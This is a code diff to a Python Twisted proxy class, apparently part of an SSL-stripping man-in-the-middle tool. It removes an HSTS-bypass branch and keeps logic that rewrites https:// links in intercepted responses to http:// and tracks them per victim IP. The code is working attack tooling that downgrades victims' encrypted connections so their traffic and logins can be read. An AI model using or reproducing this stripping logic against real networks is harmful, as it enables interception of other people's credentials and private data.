@@ -63,7 +63,6 @@ class ServerConnection(HTTPClient):
         self.clientInfo       = {}
         self.plugins          = ProxyPlugins()
         self.urlMonitor       = URLMonitor.getInstance()
-        self.hsts             = URLMonitor.getInstance().hsts
         self.app              = URLMonitor.getInstance().app
         self.isImageRequest   = False
         self.isCompressed     = False
@@ -170,8 +169,9 @@ class ServerConnection(HTTPClient):
         if (self.isImageRequest and self.contentLength != None):
             self.client.setHeader("Content-Length", self.contentLength)
 
-        self.client.setHeader("Expires", "0")
-        self.client.setHeader("Cache-Control", "No-Cache")
+        if self.urlMonitor.caching is False:
+            self.client.setHeader("Expires", "0")
+            self.client.setHeader("Cache-Control", "No-Cache")
 
         if self.length == 0:
             self.shutdown()
@@ -192,11 +192,7 @@ class ServerConnection(HTTPClient):
         if (self.isImageRequest):
             self.shutdown()
         else:
-            #Gets rid of some generic errors
-            try:
-                HTTPClient.handleResponseEnd(self) 
-            except:
-                pass
+            HTTPClient.handleResponseEnd(self)
 
     def handleResponse(self, data):
         if (self.isCompressed):
@@ -214,60 +210,28 @@ class ServerConnection(HTTPClient):
         
         try:
             self.client.write(data)
-        except:
+        except RuntimeError:
             pass
 
-        try:
-            self.shutdown()
-        except:
-            log.info("Client connection dropped before request finished.")
+        self.shutdown()
 
     def replaceSecureLinks(self, data):
-        if self.hsts:
+        iterator = re.finditer(ServerConnection.urlExpression, data)
 
-            sustitucion = {}
-            patchDict = self.urlMonitor.patchDict
+        for match in iterator:
+            url = match.group()
 
-            if patchDict:
-                dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
-                data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
+            log.debug("Found secure reference: " + url)
 
-            iterator = re.finditer(ServerConnection.urlExpression, data)       
-            for match in iterator:
-                url = match.group()
+            url = url.replace('https://', 'http://', 1)
+            url = url.replace('&amp;', '&')
+            self.urlMonitor.addSecureLink(self.clientInfo['clientip'], url)
 
-                log.debug("Found secure reference: " + url)
-                nuevaurl=self.urlMonitor.addSecureLink(self.clientInfo['clientip'], url)
-                log.debug("Replacing {} => {}".format(url,nuevaurl))
-                sustitucion[url] = nuevaurl
-
-            if sustitucion:
-                dregex = re.compile("({})".format("|".join(map(re.escape, sustitucion.keys()))))
-                data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
-
-            return data
-
-        else:
-
-            iterator = re.finditer(ServerConnection.urlExpression, data)
-
-            for match in iterator:
-                url = match.group()
-
-                log.debug("Found secure reference: " + url)
-
-                url = url.replace('https://', 'http://', 1)
-                url = url.replace('&amp;', '&')
-                self.urlMonitor.addSecureLink(self.clientInfo['clientip'], url)
-
-            data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
-            return re.sub(ServerConnection.urlType, 'http://', data)
+        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+        return re.sub(ServerConnection.urlType, 'http://', data)
 
     def shutdown(self):
         if not self.shutdownComplete:
             self.shutdownComplete = True
-            try:
-                self.client.finish()
-                self.transport.loseConnection()
-            except:
-                pass
+            self.client.finish()
+            self.transport.loseConnection()
